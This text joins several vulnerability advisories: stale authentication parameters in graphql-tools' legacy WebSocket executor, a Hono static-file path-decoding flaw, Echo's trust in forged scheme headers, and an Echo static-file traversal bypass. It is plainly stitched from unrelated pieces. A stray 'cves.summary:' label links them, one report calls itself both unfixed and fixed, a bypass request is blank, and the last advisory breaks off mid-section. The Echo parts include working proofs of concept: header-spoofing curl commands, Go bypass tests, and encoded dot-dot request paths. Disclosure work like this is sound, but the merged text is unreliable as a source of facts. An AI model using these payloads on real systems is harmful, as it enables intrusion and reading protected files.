# Stale authentication state in `@graphql-tools/executor-legacy-ws`: per-request `extensions.connectionParams` persist in executor closure state and are replayed in a later caller's `connection_init`

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/executor-legacy-ws` (npm, `pkg:npm/%40graphql-tools/executor-legacy-ws`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `buildWSLegacyExecutor` (`packages/executors/legacy-ws/src/index.ts`) |
| Vulnerability class | Stale authentication state / credential reuse across requests |
| Verified against | Commit `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`; npm release `1.1.33` installed and exercised. During validation the same behaviour was also observed on the current latest release `1.1.35`, and the unreset closure is still present on `master`. |
| API surface | Public documented API (`buildWSLegacyExecutor`, and `request.extensions.connectionParams` on the returned executor) |
| Affected in default configuration | Yes — the factory returns a general, reusable `Executor` with no per-identity or single-use restriction, and no supported teardown clears the retained parameters. |

Version note: the originally recorded affected range was `<= 1.1.33`. Validation showed that range understates exposure — the same proof of concept leaks identically on `1.1.35`.

## Summary

`buildWSLegacyExecutor` keeps a single closure-scoped object, `executorConnectionParams`, for the lifetime of the executor. Every execution that carries `request.extensions.connectionParams` merges those keys into that object with `Object.assign`, and the object is merged into the `connection_init` payload each time a new WebSocket opens. Nothing ever removes keys: `cleanupWebsocket` terminates the socket and nulls the handle but leaves `executorConnectionParams` intact, and a later request that simply omits a key skips the conditional update entirely.

The consumer-side shape is a shared executor that forwards per-user credentials. When one long-lived executor serves multiple principals — the schema-stitching, gateway, or mesh pattern where each `ExecutionRequest` supplies its own `extensions.connectionParams` — a request that omits the auth key is sent to the downstream server with the previous caller's `Authorization`/tenant values in its `connection_init`, so the downstream server authenticates the later caller as the earlier user.

Behaviour of the neighbouring state in the same file:

- WebSocket handle (`websocket`) → reset on teardown in `cleanupWebsocket`, [lines 78-88](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L78-L88)
- Per-request `connectionParams` merge, present case → applied as documented, [lines 93-101](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L93-L101)
- `executorConnectionParams` closure object → **never reset; survives socket teardown and is re-sent on the next connection, [line 32](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L32) and [line 54](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L54)**

## Impact

A caller who supplies no credentials (or lower-privileged ones) can have its downstream GraphQL subscription executed under a previous user's retained token or tenant value, and can receive data that its own `connection_init` would not authorize. The credential itself is never disclosed to the attacker — it reaches the sink through closure storage, not because the attacker knows it — but the downstream authorization it represents is.

The new capability versus safe behaviour: without this bug, an anonymous request would open a connection whose `connection_init` contains only base options plus that request's own parameters, and the downstream server would treat it as anonymous. With it, the anonymous request inherits the victim's authorization. Validation also showed partial-overwrite merging: a later caller supplying only `{tenant: "<attacker tenant>"}` gets the victim's `Authorization` retained alongside its own tenant, i.e. an attacker-chosen tenant authenticated with someone else's bearer token.

Scoring note: **not scored.** No CVSS vector accompanies this finding, and exploitability depends on the consuming application's data flow rather than on the library alone. Consumers that construct a fresh executor per request are **not** affected — the in-repository `UrlLoader` wrapper ([`packages/loaders/url/src/index.ts:172-182`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/loaders/url/src/index.ts#L172-L182)) builds a new executor for each request and therefore does not exhibit the persistence. The exposure is to applications that use the exported factory directly and share the executor.

## Preconditions

1. One executor instance created by `buildWSLegacyExecutor` is reused across requests belonging to different users or authorization contexts.
2. The application uses the explicitly supported `extensions.connectionParams` field to carry per-request downstream identity. This field is documented only by the source comment at [line 91](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L91), which says additional connection params can be supplied through extensions but does not warn that values persist into later requests.
3. The first operation's socket is closed before the later operation opens a new one. This is the normal path, not an edge case: the `COMPLETE` handler calls `cleanupWebsocket()` after every operation.
4. Attacker capability required: the ability to make a request through the sharing application — in a gateway, a remote user controls whether they authenticate and which subscription they ask for, and an anonymous request naturally leaves the `connectionParams` key absent.
5. The later request omits at least one sensitive key rather than overwriting every prior key (`Object.assign` merges, it does not replace).

This does **not** require non-standard usage, monkey-patching, or unusual configuration: the affected path is the documented `extensions.connectionParams` feature on the package's public API, and the library does not document per-request credential isolation as a caller responsibility. Validation confirmed that the library's own documented teardown, `executor[Symbol.dispose]()` (bound to `cleanupWebsocket`), does not clear the state either — no supported API resets it.

## Data flow

1. **Source** — a victim `ExecutionRequest` supplies `extensions.connectionParams`, commonly an `Authorization` or tenant token ([`packages/executors/legacy-ws/src/index.ts:90-100`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L90-L100)).
2. **Propagation** — `Object.assign` stores those keys in the closure-scoped `executorConnectionParams` ([`index.ts:32`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L32), [`index.ts:97-100`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L97-L100)).
3. **Propagation** — `cleanupWebsocket` terminates the socket but does not reset `executorConnectionParams` ([`index.ts:78-88`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L78-L88)); the attacker's later request omits `connectionParams`, so the conditional update is skipped and the old keys remain ([`index.ts:93-101`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L93-L101)).
4. **Sink** — the new socket's `onopen` merges the retained state into the `connection_init` payload and sends it before the attacker's operation: `payload = Object.assign(payload, executorConnectionParams); websocket!.send(...connection_init payload...)` ([`index.ts:44-65`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L44-L65), [`index.ts:120-129`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L120-L129)).
5. **Reachability** — the package directly exports `buildWSLegacyExecutor` ([`index.ts:27`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L27)), and the entry point is the returned disposable executor plus `request.extensions.connectionParams`.

## Vulnerable code

`packages/executors/legacy-ws/src/index.ts`, lines 32-100 at `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`:

```ts
let executorConnectionParams = {};        // closure state, lives as long as the executor
...
payload = Object.assign(payload, executorConnectionParams);   // sink: retained keys enter connection_init
websocket!.send(JSON.stringify({ type: LEGACY_WS.CONNECTION_INIT, payload }));
...
if (request.extensions?.['connectionParams'] && typeof request.extensions?.['connectionParams'] === 'object') {
  executorConnectionParams = Object.assign(executorConnectionParams, request.extensions['connectionParams']);
}
// no else branch: a request that omits connectionParams leaves the previous request's keys in place,
// and cleanupWebsocket (lines 78-88) resets only `websocket`, never `executorConnectionParams`.
```

## Reproduction

**Verified dynamically against the real package**, not by static review alone. Release `1.1.33` was installed from npm and driven against a live local `ws` server implementing the legacy `graphql-ws` protocol, recording the `connection_init` payload of every physical connection.

Observed across the validation runs, using one shared executor instance:

- Request 1 (victim) sent `extensions.connectionParams` `{Authorization: "Bearer VICTIM-ALICE-SECRET-TOKEN", tenant: "alice-tenant"}`. After that subscription completed, the executor sent `connection_terminate` and tore the socket down.
- Request 2 supplied **no** `connectionParams`, yet the server observed a brand-new connection whose `connection_init` payload was byte-identical to the victim's, including the victim's bearer token.
- Partial overwrite: when the later caller supplied only `{tenant: "mallory-tenant"}`, `Object.assign` merged rather than replaced, so the victim's `Authorization` was retained alongside the attacker's tenant.
- Calling `executor[Symbol.dispose]()` between requests did not clear the state.
- Negative control: patching the installed `1.1.33` to add `executorConnectionParams = {}` inside `cleanupWebsocket` made the second connection's init payload `{}`, so the leak is causally attributable to the missing reset.
- The same proof of concept leaks identically on `1.1.35`, and `master` still contains the unreset closure. Upstream line numbers on `master` are slightly offset from those cited above (closure declaration L38, conditional `Object.assign` L100-105, `cleanupWebsocket` L84, `onopen` merge L60-63).

Steps:

1. Run a legacy GraphQL WS server that records the `connection_init` payload and authorizes notifications by `Authorization` value.
2. Use one executor for a victim request with `extensions.connectionParams.Authorization = 'Bearer victim-token'`; finish/unsubscribe it so cleanup closes the socket.
3. Use the same executor for an anonymous request with no `extensions.connectionParams`.
4. Observe that the second `connection_init` still contains `Bearer victim-token` and that the anonymous subscription receives victim-authorized results.

```ts
import WebSocket from 'isomorphic-ws';
import { parse } from 'graphql';
import { buildWSLegacyExecutor } from '@graphql-tools/executor-legacy-ws';

const exec = buildWSLegacyExecutor('ws://localhost:8081/graphql', WebSocket);

const v = exec({
  document: parse('subscription { privateEvents { id } }'),
  extensions: { connectionParams: { Authorization: 'Bearer victim-token' } },
});
await v.next();
await v.return?.(); // iterator cleanup closes the first socket; executorConnectionParams is not cleared

const a = exec({ document: parse('subscription { privateEvents { id } }') });
await a.next(); // the server logs a second connection_init payload still carrying Authorization: Bearer victim-token
```

- **Expected:** the second `connection_init` payload contains only the base options and the second request's own parameters, with no key omitted by that request carried over from the victim.
- **Actual:** the second `connection_init` carries the victim's retained `Authorization`/tenant values, and the downstream server authenticates the later caller as the victim.

## Suggested remediation

Do not retain operation-level `extensions.connectionParams` beyond the operation and connection they belong to: build each `connection_init` payload from the base options plus the current request's parameters only, and clear connection-specific state during cleanup.

```ts
// 1. Clear the retained state when the connection is torn down.
function cleanupWebsocket() {
  // ... existing connection_terminate / terminate / websocket = null ...
  executorConnectionParams = {};
}
```

Alternative, and the more complete form: stop accumulating into shared closure state at all — derive the payload per request, e.g. `const payload = { ...options.connectionParams, ...(request.extensions?.['connectionParams'] ?? {}) }`, passed down to the `onopen` handler for that connection rather than read from the executor closure.

Notes:

- `executor[Symbol.dispose]()` is bound to `cleanupWebsocket`, so fixing the reset there also makes the documented teardown behave as callers expect.
- `Object.assign` merges rather than replaces, so a later request supplying *some* parameters still inherits the keys it omits; a fix that only replaces the object on the "present" branch would leave this half-open.
- The `UrlLoader` path in this repository constructs a fresh executor per request and is already safe; no change is needed there. The exposure is to direct consumers of the exported `buildWSLegacyExecutor`.
- It would also help to define explicitly whether mixing distinct auth contexts on one executor is supported, and to reject it if not — today the factory returns a general `Executor` with no stated per-identity restriction.

Suggested regression test alongside the package's existing legacy-ws executor tests (the exact spec file is **not verified** by the available information): drive one executor against a recording server, send request 1 with `extensions.connectionParams = { Authorization: 'Bearer victim-token' }`, let it complete, then send request 2 with no `connectionParams`, and assert the second `connection_init` payload contains no `Authorization` key. Add a second case where request 2 supplies only `{ tenant: 'other' }` and assert the payload is exactly `{ tenant: 'other' }` plus base options.

## Disclosure status

Currently undisclosed: no CVE, GHSA, advisory URL, upstream issue, or fix commit is associated with this finding, and no fixed version exists to upgrade to.

## Resolution

Fixed in `@graphql-tools/executor-legacy-ws@1.1.36`, which is published on npm. Each execution opens its own socket. `connection_init` is built from the executor's base `connectionParams` plus only that request's `extensions.connectionParams`. Upgrade to `>=1.1.36`.

### Summary

`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.

### Details

Hono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.

### Impact

An unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.

cves.summary:
## Description

`Context.Scheme()` unconditionally trusts four client-controlled HTTP headers to determine the request scheme, with no mechanism to configure trusted sources. This allows a remote unauthenticated attacker to bypass HTTPS redirect enforcement and suppress HSTS headers.

The trusted headers (checked in this order of precedence):
1. `X-Forwarded-Proto`
2. `X-Forwarded-Protocol`
3. `X-Forwarded-Ssl`
4. `X-Url-Scheme`

### Threat model

**Scenario A — Directly exposed application (vulnerable by default):**
The Echo application listens on HTTP and is reachable directly by clients (no L7 proxy in front), or an attacker can bypass the proxy and reach the backend directly. In this case, the attacker has full control over all request headers. Sending `X-Forwarded-Proto: https` defeats the `HTTPSRedirect` middleware entirely — traffic stays on plaintext HTTP, enabling man-in-the-middle attacks.

This is the primary scenario. The application is vulnerable by default with no misconfiguration required — simply using `e.Pre(middleware.HTTPSRedirect())` as documented is sufficient.

**Scenario B — Behind L7 proxy with header sanitization (reduced risk):**
If the application is strictly behind a correctly configured L7 proxy that always overwrites `X-Forwarded-Proto` and there is no direct access to the backend, the practical risk is lower. However, this relies on perimeter controls external to the framework, not on the framework itself. As Echo's own IP-extraction documentation states: *"you must not trust HTTP headers unconditionally."*

### Root cause

`context.go`, lines 161–181:

```go
func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        return scheme
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProtocol); scheme != "" {
        return scheme
    }
    if ssl := c.request.Header.Get(HeaderXForwardedSsl); ssl == "on" {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXUrlScheme); scheme != "" {
        return scheme
    }
    return "http"
}
```

Two additional issues with this implementation:

1. **No value validation.** `Scheme()` returns any arbitrary string from the header, not just `"http"` or `"https"`. This breaks the documented contract ("returns the HTTP protocol scheme, `http` or `https`") and causes unexpected behavior in middleware that uses the return value to construct URLs (e.g., `WWWRedirect` builds `scheme + "://www." + host + uri`).

2. **Consumed by security-critical middleware.** The return value is used directly by redirect middleware (`middleware/redirect.go:136`) and secure middleware (`middleware/secure.go:125`) for security enforcement decisions.

### Affected components

| Component | File | Line(s) | Impact |
|-----------|------|---------|--------|
| `Context.Scheme()` | `context.go` | 161–181 | Returns attacker-controlled scheme |
| `HTTPSRedirect` | `middleware/redirect.go` | 147–151 | HTTPS enforcement bypassed |
| `HTTPSWWWRedirect` | `middleware/redirect.go` | 154–161 | HTTPS enforcement bypassed |
| `HTTPSNonWWWRedirect` | `middleware/redirect.go` | 163–170 | HTTPS enforcement bypassed |
| `WWWRedirect` | `middleware/redirect.go` | 172–177 | URL constructed with arbitrary scheme |
| `NonWWWRedirect` | `middleware/redirect.go` | 179–184 | URL constructed with arbitrary scheme |
| Secure middleware (HSTS) | `middleware/secure.go` | 125 | HSTS header suppressed |

### This is an unsafe-by-default API surface, not just misconfiguration

This behavior is not accidental — it is codified in the project's own test suite. For example, `middleware/redirect_test.go` (lines 29–34) explicitly asserts that `X-Forwarded-Proto: https` on an HTTP request results in 200 OK (no redirect):

```go
{
    whenHost:         "labstack.com",
    whenHeader:       map[string][]string{echo.HeaderXForwardedProto: {"https"}},
    expectLocation:   "",
    expectStatusCode: http.StatusOK,
},
```

Similarly, `middleware/secure_test.go` (lines 42–53) and `context_test.go` (lines 1104–1111) assert that scheme is derived from the header.

The problem is not that the framework *can* use forwarded headers — that is legitimate behind a trusted proxy. The problem is that **there is no mechanism to control whether this trust is appropriate**, unlike the existing IP header trust model. `Scheme()` always trusts the headers, making any middleware that depends on it unsafe-by-default.

### Inconsistency with existing trust model

Echo already recognizes this class of header-trust vulnerability for IP addresses. The `IPExtractor` mechanism with `TrustOption` (`TrustLoopback`, `TrustPrivateNet`, `TrustLinkLocal`, `TrustIPRange`) was introduced specifically because:

> *"you must not trust HTTP headers unconditionally. Otherwise, you might give someone a chance of deceiving you. **A security risk!**"*
> — `ip.go`, lines 20–21

> *"If you put no proxy (e.g., directly facing the internet), all you need to (and have to) see is IP address from network layer. Any HTTP header is untrustable because the clients have full control what headers to be set."*
> — `ip.go`, lines 36–38

No equivalent mechanism exists for scheme detection. `Scheme()` unconditionally trusts all four forwarded headers with no configuration, opt-in, or documentation warning.

### Note on proxies and the "3 additional headers"

A correctly configured nginx `proxy_set_header X-Forwarded-Proto $scheme;` overwrites `X-Forwarded-Proto` with the actual incoming scheme. When a proxy does this, `X-Forwarded-Proto` is trustworthy and the three fallback headers (`X-Forwarded-Protocol`, `X-Forwarded-Ssl`, `X-Url-Scheme`) are never reached because `X-Forwarded-Proto` takes precedence in `Scheme()`.

The three additional headers become real attack vectors specifically when:
- The proxy does **not** set `X-Forwarded-Proto` at all (common in default proxy configs), or
- The application is directly exposed (Scenario A above).

In such cases, an attacker can bypass via any of the four headers. The main vulnerability (HTTPS redirect bypass via `X-Forwarded-Proto` on a directly exposed app) does not depend on the additional headers.

## Impact

**HTTPS downgrade / MITM:** An attacker who can reach the Echo HTTP endpoint directly can prevent HTTPS redirection, keeping client traffic on plaintext HTTP and enabling man-in-the-middle attacks.

**HSTS suppression:** Behind a TLS-terminating proxy, spoofing `X-Forwarded-Proto: http` prevents the `Strict-Transport-Security` header from being sent. When the response ultimately reaches the client over HTTPS (via the proxy), the missing HSTS header weakens browser-side HTTPS enforcement. Note: browsers ignore HSTS received over plain HTTP, so the practical risk is specifically in the suppression scenario behind a TLS-terminating proxy, not in injecting HSTS on HTTP.

**URL construction with arbitrary scheme:** `WWWRedirect` and `NonWWWRedirect` use `c.Scheme()` to build redirect URLs (`scheme + "://www." + host + uri`). An attacker can inject arbitrary strings (e.g., `javascript:`, `data:`) as the scheme component of redirect URLs.

## Proof of Concept

Tested on Echo **v5.0.4** (commit `fa5311b`, 2026-02-15).

### PoC 1: HTTPS Redirect Bypass (Go test)

```go
package echo_test

import (
    "net/http"
    "net/http/httptest"
    "testing"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func TestHTTPSRedirectBypass(t *testing.T) {
    e := echo.New()
    e.Pre(middleware.HTTPSRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "served over: "+c.Scheme())
    })

    // Normal HTTP → should redirect
    req := httptest.NewRequest(http.MethodGet, "/", nil)
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)
    if rec.Code != http.StatusMovedPermanently {
        t.Fatalf("expected 301, got %d", rec.Code)
    }
    t.Logf("Normal HTTP → %d (redirect to %s)", rec.Code, rec.Header().Get("Location"))

    // Attack: all 4 headers bypass the redirect
    headers := map[string]string{
        "X-Forwarded-Proto":    "https",
        "X-Forwarded-Protocol": "https",
        "X-Forwarded-Ssl":      "on",
        "X-Url-Scheme":         "https",
    }
    for name, value := range headers {
        req := httptest.NewRequest(http.MethodGet, "/", nil)
        req.Header.Set(name, value)
        rec := httptest.NewRecorder()
        e.ServeHTTP(rec, req)
        if rec.Code == http.StatusOK {
            t.Errorf("BYPASS via %s: %s → %d (no redirect!)", name, value, rec.Code)
        }
    }
}
```

### PoC 2: curl examples (easiest to reproduce)

Start a minimal Echo server:

```go
package main

import (
    "net/http"
    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    e.Pre(middleware.HTTPSRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "Hello on "+c.Scheme())
    })
    e.Start(":8080")
}
```

Then:

```bash
# Normal HTTP → 301 redirect (expected)
$ curl -I http://localhost:8080/
HTTP/1.1 301 Moved Permanently
Location: https://localhost:8080/

# Attack: bypass via X-Forwarded-Proto
$ curl -H "X-Forwarded-Proto: https" http://localhost:8080/
Hello on https

# Attack: bypass via X-Forwarded-Protocol
$ curl -H "X-Forwarded-Protocol: https" http://localhost:8080/
Hello on https

# Attack: bypass via X-Forwarded-Ssl
$ curl -H "X-Forwarded-Ssl: on" http://localhost:8080/
Hello on https

# Attack: bypass via X-Url-Scheme
$ curl -H "X-Url-Scheme: https" http://localhost:8080/
Hello on https
```

### PoC 3: Arbitrary scheme in redirect URL (WWWRedirect)

```go
func TestArbitrarySchemeInRedirect(t *testing.T) {
    e := echo.New()
    e.Pre(middleware.WWWRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    })

    req := httptest.NewRequest(http.MethodGet, "/", nil)
    req.Host = "example.com"
    req.Header.Set("X-Forwarded-Proto", "javascript")
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)

    // Redirect Location uses the spoofed scheme
    loc := rec.Header().Get("Location")
    // loc == "javascript://www.example.com/" — violates http/https contract
    t.Logf("Status: %d, Location: %s", rec.Code, loc)
}
```

### PoC 4: HSTS Suppression

```go
func TestHSTSSuppression(t *testing.T) {
    e := echo.New()
    e.Use(middleware.SecureWithConfig(middleware.SecureConfig{HSTSMaxAge: 31536000}))
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    })

    // Legitimate: proxied HTTPS should have HSTS
    req := httptest.NewRequest(http.MethodGet, "/", nil)
    req.Header.Set("X-Forwarded-Proto", "https")
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)
    if h := rec.Header().Get("Strict-Transport-Security"); h == "" {
        t.Fatal("HSTS missing when it should be present")
    }

    // Attack: suppress HSTS by spoofing "http"
    // In production: app behind TLS-terminating proxy, proxy delivers response
    // to client over HTTPS, but HSTS header is absent due to spoofed header
    req2 := httptest.NewRequest(http.MethodGet, "/", nil)
    req2.Header.Set("X-Forwarded-Proto", "http")
    rec2 := httptest.NewRecorder()
    e.ServeHTTP(rec2, req2)
    if h := rec2.Header().Get("Strict-Transport-Security"); h == "" {
        t.Error("VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http")
    }
}
```

### Test output (all attacks succeed)

```
=== RUN   TestHTTPSRedirectBypass
    Normal HTTP → 301 (redirect to https://example.com/)
    BYPASS via X-Forwarded-Proto: https → 200 (no redirect!)
    BYPASS via X-Forwarded-Protocol: https → 200 (no redirect!)
    BYPASS via X-Forwarded-Ssl: on → 200 (no redirect!)
    BYPASS via X-Url-Scheme: https → 200 (no redirect!)

=== RUN   TestArbitrarySchemeInRedirect
    Status: 301, Location: javascript://www.example.com/

=== RUN   TestHSTSSuppression
    VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http
```

## Precedent CVEs

- **CVE-2018-1193** — Cloud Foundry GoRouter: unverified `X-Forwarded-Proto` header trusted for scheme, enabling HTTPS enforcement bypass. Fixed by adding `sanitize_forwarded_proto` option.
- **CVE-2025-41235** — Spring Cloud Gateway: trusting forwarded headers without explicit proxy configuration, enabling HTTPS redirect bypass. Fixed by requiring trusted proxy configuration.

## Suggested fix

### Option A: `SchemeExtractor` (recommended, backward-compatible with opt-in)

Add a `SchemeExtractor` mechanism analogous to the existing `IPExtractor`, where the extractor decides whether to trust forwarded headers based on `RemoteAddr` or trusted proxy ranges:

```go
type SchemeExtractor func(req *http.Request) string

// ExtractSchemeDirect ignores all forwarded headers (secure default)
func ExtractSchemeDirect() SchemeExtractor { ... }

// ExtractSchemeFromXFFHeader trusts X-Forwarded-Proto from trusted sources
func ExtractSchemeFromXFFHeader(options ...TrustOption) SchemeExtractor { ... }
```

Usage:

```go
// Secure: directly exposed, ignore headers
e.SchemeExtractor = echo.ExtractSchemeDirect()

// Behind trusted proxy
e.SchemeExtractor = echo.ExtractSchemeFromXFFHeader(
    echo.TrustIPRange(proxySubnet),
)
```

The default should be secure. For backward compatibility, a migration period with deprecation warnings for the legacy behavior may be appropriate.

### Option B: Minimal hardening (does NOT fix the bypass, but fixes the contract violation)

`Scheme()` should validate that the returned value is `"http"` or `"https"`, rejecting arbitrary strings. This prevents the "arbitrary scheme in redirect URL" issue but does not address the core HTTPS redirect bypass (because `"https"` is a valid value that the attacker injects).

### Both options should be applied together.

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. `Context.Scheme()` now uses the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme` headers only when the request comes directly from a loopback, link-local or private network address or a unix socket. When `X-Forwarded-Proto` is present, only its last value is used. The new `Echo#SchemeExtractor` selects the strategy (`ExtractSchemeFromHeaders`, `ExtractSchemeDirect`, `LegacySchemeExtractor`). The Secure middleware sets HSTS from `Context.Scheme()`, and the Proxy middleware always sets `X-Forwarded-Proto` and removes the other scheme headers.

## Workarounds

If a proxy or load balancer connects to your application from a public address, trust its address ranges after upgrading, for example `e.SchemeExtractor = echo.ExtractSchemeFromHeaders(echo.TrustIPRange(proxyRange))`; otherwise `HTTPSRedirect` redirects in a loop. If you cannot upgrade, make sure every request passes through a proxy that overwrites `X-Forwarded-Proto` and removes `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme`, and that the application cannot be reached directly.

## Summary

Echo v5.2.0 contains a bypass of the fix for GHSA-vfp3-v2gw-7wfq. The fix rejects encoded path separators such as `%2F` and `%5C` before static file path unescaping, but two traversal forms still bypass route-level middleware protections for static files.

The primary bypass uses encoded dot-dot segments. A request such as `/public/%2E%2E/admin/secret.txt` passes the encoded-separator guard, is unescaped to `public/../admin/secret.txt`, then `path.Clean` resolves it to `admin/secret.txt`. If `/admin/*` is protected by middleware but the static filesystem is mounted at `/`, the protected file is returned through the public static route.

A second bypass exists when `UseEscapedPathForMatching=true`. In that mode, the router normalizes encoded separators before the static handler checks the wildcard. The handler receives a decoded wildcard with no `%` characters, so the encoded-separator guard does not run on the original encoded path.

## Impact

An unauthenticated attacker can read files that an application intended to protect with route-level middleware, when those files are also reachable through a static filesystem mount after path normalization.

The high-severity variant works with the default router configuration and requires only encoded dot-dot path segments. The direct protected route returns 403, while the public static route returns the protected file content.

The `UseEscapedPathForMatching=true` variant is lower severity because it requires a non-default router configuration.

## Affected versions

Tested vulnerable:

- `github.com/labstack/echo/v5` v5.2.0
- Current `master` at `5786024ea4d85c01784796e8aa7aac53e007b39b`

No patched version is currently known.

## Policy and version checks

GitHub Private Vulnerability Reporting is enabled for `labstack/echo`. The repository has a root `SECURITY.md` and accepts security reports through GitHub Security Advisories.

The vulnerable code was revalidated on both current `master` and the latest release tag:

- Current `master`: `5786024ea4d85c01784796e8aa7aac53e007b39b`
- Latest release: `v5.2.0`, published June 14 2026
- Package: `github.com/labstack/echo/v5`

The same focused Go tests pass on the checked out `v5.2.0` / `master` commit, proving the bypass remains present in the latest released version and latest main branch at the time of reporting.

## Reproduction

The following application shape reproduces the high-severity bypass:

```go
e := echo.New()

g := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
    return func(c echo.Context) error {
        return echo.NewHTTPError(http.StatusForbidden)
    }
})
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)
```

Control request:

```http
GET /admin/secret.txt
```

Observed result:

```text
403 Forbidden
```

Bypass request:

```http

```

Observed result:

```text
200 OK
TOP-SECRET
```

For the non-default router variant:

```go
e := echo.New()
e.router = echo.NewRouter(echo.RouterConfig{
    UseEscapedPathForMatching: true,
})

g := e.Group("/admin", authMiddlewareReturning403)
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)
```

Bypass request:

```http
GET /public%2F..%2Fadmin%2Fsecret.txt
```

Observed result:

```text
200 OK
TOP-SECRET
```

## Proof of concept evidence

I added focused tests against the current Echo codebase. The tests exercise both `StaticDirectoryHandler` and the static middleware path.

Command:

```bash
go test -run TestHostile -v ./...
```

Observed result:

```text
=== RUN   TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked
PASS: TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked (0.00s)
=== RUN   TestHostile_StaticDirectoryHandler_EncodedDotDotBypass
PASS: TestHostile_StaticDirectoryHandler_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_UseEscapedPathForMatching_Bypass
PASS: TestHostile_UseEscapedPathForMatching_Bypass (0.00s)
PASS
ok  github.com/labstack/echo/v5  0.013s
=== RUN   TestHostile_StaticMiddleware_EncodedSeparatorsBlocked
PASS: TestHostile_StaticMiddleware_EncodedSeparatorsBlocked (0.01s)
=== RUN   TestHostile_StaticMiddleware_EncodedDotDotBypass
PASS: TestHostile_StaticMiddleware_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_StaticMiddleware_DisablePathUnescaping
PASS: TestHostile_StaticMiddleware_DisablePathUnescaping (0.00s)
PASS
ok  github.com/labstack/echo/v5/middleware  0.012s
```

The control tests also confirm that the new fix blocks encoded separators such as `%2F`, `%5C`, double-encoded slash values, null bytes, and overlong slash encodings.

## Root cause

The fix for GHSA-vfp3 uses a denylist-style guard that checks for encoded path separators before unescaping the static wildcard. This blocks `%2F` and `%5C`, but does not block encoded traversal segments such as `%2E%2E`.

The vulnerable flow is:

1. The static route wildcard accepts `public/%2E%2E/admin/secret.txt`.
2. The encoded-separator guard sees no `%2F` or `%5C` and allows the request.
3. The handler unescapes the wildcard to `public/../admin/secret.txt`.
4. `path.Clean` resolves it to `admin/secret.txt`.
5. The file is served through the public static route instead of the protected `/admin/*` route.

For `UseEscapedPathForMatching=true`, the router decodes the path before the static handler sees the wildcard, so the handler cannot detect that encoded separators were used in the original request.

## Remediation

Do not rely only on detecting encoded separators. Reject encoded traversal sequences before unescaping, and reject normalized wildcard values that cross route or static mount boundaries.

Possible fixes:

